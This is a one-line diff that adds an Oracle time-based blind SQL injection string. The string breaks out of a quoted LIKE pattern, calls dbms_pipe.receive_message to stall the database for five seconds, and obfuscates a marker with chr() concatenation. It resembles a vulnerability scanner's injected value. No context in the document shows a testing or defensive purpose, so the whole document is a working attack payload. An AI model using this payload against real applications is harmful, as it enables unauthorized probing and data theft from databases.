@@ -1,0 +1,1 @@
+1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='
